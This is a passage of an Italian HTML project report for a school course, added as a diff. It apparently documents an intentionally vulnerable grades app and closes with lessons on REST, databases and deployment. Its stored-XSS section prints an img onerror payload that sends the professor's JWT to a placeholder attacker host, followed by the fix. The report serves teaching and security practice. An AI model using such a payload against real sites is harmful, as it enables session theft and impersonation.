+a controllare l'autorizzazione: uno studente può chiedere solo i
+propri voti, un professore solo quelli dei propri studenti.
+</p>
+
+<h3>10.3 Stored XSS sulle risposte di verifica</h3>
+<p>
+La pagina <code>risposte.html</code> visualizza le risposte degli
+studenti inserendole nel DOM con <code>innerHTML</code> senza alcun
+escaping. Uno studente può inserire come risposta:
+</p>
+<pre><code>&lt;img src=x onerror="fetch('https://attaccante/?t=' +
+                       localStorage.getItem('classemorta_jwt'))"&gt;</code></pre>
+<p>
+Quando il professore aprirà la review, il browser eseguirà il
+JavaScript nel contesto della sessione del prof: il suo JWT verrà
+inviato all'attaccante, che potrà impersonarlo via REST. La fix
+è semplice: usare <code>textContent</code> (o una funzione di
+<i>HTML escaping</i>) anziché <code>innerHTML</code> quando si
+mostrano dati provenienti dagli utenti, e idealmente impostare anche
+una <code>Content-Security-Policy</code> restrittiva.
+</p>
+
+<!-- =================== 11. CONCLUSIONI =================== -->
+<h2>11. Conclusioni</h2>
+
+<p>
+ClasseMorta è una palestra completa per esercitare i concetti fondamentali
+del modulo TPSIT: <b>progettazione di un'API REST</b> con autenticazione
+JWT, <b>gestione di due database</b> di paradigmi opposti,
+<b>containerizzazione</b> e <b>deploy in cloud</b> di servizi separati,
+<b>chiamate asincrone</b> da JavaScript con due tecnologie diverse.
+</p>
+
+<p>
+La scelta dell'architettura decoupled, oltre a essere una buona pratica
+moderna, ha permesso di sviluppare front-end e back-end in modo
+indipendente e di deployarli separatamente su Railway tramite Docker.
+</p>
+
+<p>
+La presenza delle tre vulnerabilità (SQLi, NoSQLi, Stored XSS) rende il
+progetto particolarmente utile dal punto di vista della cybersecurity:
+permette di toccare con mano errori realistici, di vederne gli effetti
+in un ambiente controllato e di praticare le correzioni canoniche.
+</p>
+
+<p>
+La principale lezione operativa è che <b>scegliere il database giusto
+per il caso d'uso</b> è altrettanto importante quanto saper scrivere
+una buona query: i voti, dati semplici, voluminosi e in continua
+evoluzione, hanno trovato la loro casa naturale in MongoDB; gli
+utenti, le relazioni didattiche e le verifiche, dati strutturati e
+con vincoli forti, sono pienamente a loro agio in Postgres.
+</p>
+
+</body>
+</html>
